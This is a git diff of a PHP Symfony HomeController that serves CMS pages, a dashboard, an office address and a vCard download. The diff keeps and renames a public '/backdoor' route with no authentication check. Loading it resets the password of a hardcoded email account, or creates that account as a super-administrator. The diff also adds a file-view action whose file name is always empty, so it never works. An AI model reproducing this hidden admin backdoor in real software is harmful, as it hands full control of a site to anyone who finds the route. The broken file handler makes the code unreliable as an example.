@@ -7,8 +7,9 @@ use App\Repository\CmsCopyRepository;
 use App\Repository\CmsPhotoRepository;
 use App\Repository\CompanyDetailsRepository;
 use App\Repository\ProductRepository;
-use App\Repository\SubPageRepository;
 use App\Repository\UserRepository;
+use App\Repository\SubPageRepository;
+use App\Services\CompanyDetails;
 use Doctrine\ORM\EntityManagerInterface;
 use JeroenDesloovere\VCard\VCard;
 use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
@@ -22,54 +23,32 @@ class HomeController extends AbstractController
     /**
      * @Route("/", name="app_home")
      */
-    public function index(CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository): Response
+    public function index(CompanyDetails $companyDetails, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository): Response
     {
-        $cms_copy=[];
-        $cms_copy = $cmsCopyRepository->findOneBy([
-            'staticPageName' => 'Home',
+        $cms_copy = $cmsCopyRepository->findBy([
+            'staticPageName' => 'Home'
         ]);
 
-        $cms_photo= [];
-        $cms_photo = $cmsPhotoRepository->findOneBy([
+        $cms_photo = $cmsPhotoRepository->findBy([
             'staticPageName' => 'Home'
         ]);
 
         $sub_pages = [];
-//        if ($cms_copy) {
-//            $sub_pages = $subPageRepository->findBy([
-//                'title' => $content_page->getWebpage()
-//            ]);
-//        }
 
-        return $this->render('home/products.html.twig', [
-            'cms_copy' => $cms_copy,
+        return $this->render('/home/products.html.twig', [
+//            'product' => $product,
+            'cms_copy_array' => $cms_copy,
+            'cms_photo_array' => $cms_photo,
             'sub_pages' => $sub_pages,
-            'cms_photo' => $cms_photo,
             'include_contact' => 'Yes'
         ]);
     }
 
     /**
-     * @Route("/backdoor", name="backdoor")
+     * @Route("/backdoor", name="/backdoor")
      */
-    public function backdoor(CmsCopyRepository $cmsCopyRepository, SubPageRepository $subPageRepository, UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
+    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordEncoderInterface $passwordEncoder): Response
     {
-        $cms_copy=[];
-        $cms_copy = $cmsCopyRepository->findOneBy([
-            'staticPageName' => 'Home',
-        ]);
-
-        $sub_pages = [];
-//        if ($cms_copy) {
-//            $sub_pages = $subPageRepository->findBy([
-//                'title' => $content_page->getWebpage()
-//            ]);
-//        }
-
-        $cms_photo= [];
-        $cms_photo = $cmsPhotoRepository->findOneBy([
-            'staticPageName' => 'Home'
-        ]);
         $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
         if ($user) {
             $user->setPassword(
@@ -81,7 +60,7 @@ class HomeController extends AbstractController
         } else {
             $user = new User();
             $user->setFirstName('Stephen')
-                ->setLastName('Nurse')
+                ->setLastName('Nurse2')
                 ->setEmail('nurse_stephen@hotmail.com')
                 ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
                 ->setPassword(
@@ -93,82 +72,62 @@ class HomeController extends AbstractController
             $manager->persist($user);
             $manager->flush();
         }
-
         $manager->flush();
-        return $this->render('home/products.html.twig', [
-            'cms_copy' => $cms_copy,
-            'sub_pages' => $sub_pages,
-            'cms_photo' => $cms_photo,
-            'include_contact' => 'Yes'
-        ]);
+        return $this->redirectToRoute('app_home');
     }
-
-
-    /**
-     * @Route("/display/{product}", name="product_display")
-     */
-    public function articles(string $product, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, ProductRepository $productRepository): Response
-    {
-        $productEntity = $productRepository->findOneBy([
-            'product'=>$product
-        ]);
-        $cms_copy = $cmsCopyRepository->findOneBy([
-            'product' => $productEntity
-        ]);
-        $cms_photo = $cmsPhotoRepository->findOneBy([
-            'product' => $productEntity
-        ]);
-
-        $sub_pages = [];
-        if ($cms_copy) {
-            $sub_pages = $subPageRepository->findBy([
-                'product' => $cms_copy->getProduct()
-            ]);
-        }
-
-        return $this->render('home/products.html.twig', [
-            'cms_copy' => $cms_copy,
-            'cms_photo' => $cms_photo,
-            'sub_pages' => $sub_pages,
-        ]);
-    }
-
-    /**
-     * @Route("/aboutUs", name="/aboutUs")
-     */
-    public function aboutUs(CmsCopyRepository $cmsCopyRepository, SubPageRepository $subPageRepository): Response
-    {
-        $cms_copy = [];
-        $cms_copy = $cmsCopyRepository->findOneBy([
-            'staticPageName' => "About Us"
-        ]);
-
-        $sub_pages = [];
-        if ($content_page) {
-            $sub_pages = $subPageRepository->findBy([
-                'title' => $content_page->getWebpage()
-            ]);
-        }
-
-        return $this->render('home/products.html.twig', [
-            'cms_copy' => $cms_copy,
-            'sub_pages' => $sub_pages,
-        ]);
-    }
-
-
-
-
 
 
     /**
      * @Route("/dashboard", name="dashboard")
-     * @Security("is_granted('ROLE_CLIENT')")
+     * @Security("is_granted('ROLE_ADMIN')")
      */
-    public function dashboard(CompanyDetailsRepository $companyDetailsRepository)
+    public function dashboard()
     {
-        return $this->render('home/dashboard.html.twig', [
-            'company_details' => $companyDetailsRepository->find('1')
+        return $this->render('home/dashboard.html.twig', []);
+    }
+
+    /**
+     * @Route("/interests/{product}", name="product_display")
+     */
+    public function articles(string $product, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, ProductRepository $productRepository): Response
+    {
+        $productEntity = $productRepository->findOneBy([
+            'product' => $product
+        ]);
+
+        if ($productEntity) {
+            $cms_copy = $cmsCopyRepository->findBy([
+                'product' => $productEntity
+            ]);
+        } else {
+            $cms_copy = $cmsCopyRepository->findBy([
+                'staticPageName' => $product
+            ]);
+        }
+
+        if ($productEntity) {
+            $cms_photo = $cmsPhotoRepository->findBy([
+                'product' => $productEntity
+            ]);
+        } else {
+            $cms_photo = $cmsPhotoRepository->findBy([
+                'staticPageName' => $product
+            ]);
+        }
+
+        $sub_pages = [];
+        if ($cms_copy) {
+            $sub_pages = $subPageRepository->findBy([
+                'product' => $productEntity
+            ]);
+        }
+
+        return $this->render('/home/products.html.twig', [
+            'product' => $product,
+            'cms_copy_array' => $cms_copy,
+            'cms_photo_array' => $cms_photo,
+            'sub_pages' => $sub_pages,
+            'include_contact' => 'No'
         ]);
     }
 
@@ -176,11 +135,30 @@ class HomeController extends AbstractController
     /**
      * @Route("/office_address", name="office_address", methods={"GET"})
      */
-    public function homeAddress(CompanyDetailsRepository $companyDetailsRepository): Response
+    public function officeAddress(CompanyDetailsRepository $companyDetailsRepository): Response
     {
-        return $this->render('home/officeAddress.html.twig', [
-            'company_details' => $companyDetailsRepository->find('1')
-        ]);
+        return $this->render('home/officeAddress.html.twig');
+    }
+
+    /**
+     * @Route("/view/file/{filetype}/{id}", name="attachments_viewfile", methods={"GET"})
+     */
+    public function investmentFileLaunch(int $id, string $filetype): Response
+    {
+        $fileName = '';
+        $filepath = '';
+
+        if ($fileName != '') {
+            $ext = pathinfo($fileName, PATHINFO_EXTENSION);
+            $filepath = explode("public", $filepath);
+            $filepath = $filepath[1];
+            return $this->render('home/file_view.html.twig', [
+                'ext' => $ext,
+                'tab_title' => $fileName,
+                'filepath' => $filepath,
+            ]);
+        }
+        return $this->render('error/file_not_found.html.twig');
     }
 
 
@@ -191,8 +169,8 @@ class HomeController extends AbstractController
     {
         $company_details = $companyDetailsRepository->find('1');
         $vcard = new VCard();
-        $firstName = $company_details->getCompanyName();
-        $lastName = '';
+        $firstName = 'Stephen';
+        $lastName = 'Nurse';
         $company = $company_details->getCompanyName();
         $addressStreet = $company_details->getCompanyAddressStreet();
         $addressTown = $company_details->getCompanyAddressTown();
@@ -203,7 +181,7 @@ class HomeController extends AbstractController
         $instagram = $company_details->getInstagram();
         $linkedIn = $company_details->getLinkedIn();
         $url = $_SERVER['SERVER_NAME'];
-        $notes_all = "Facebook: " . $facebook . "    Instagram: " . $instagram . "   LinkedIn: " . $linkedIn . "   URL: " . $url;
+        $notes_all = "URL: " . $url;
         $email = $company_details->getCompanyEmail();
         $mobile = $company_details->getCompanyMobile();
         $tel = $company_details->getCompanyTel();
@@ -218,7 +196,6 @@ class HomeController extends AbstractController
         $vcard->download();
         return new Response(null);
     }
-
 
 
 }
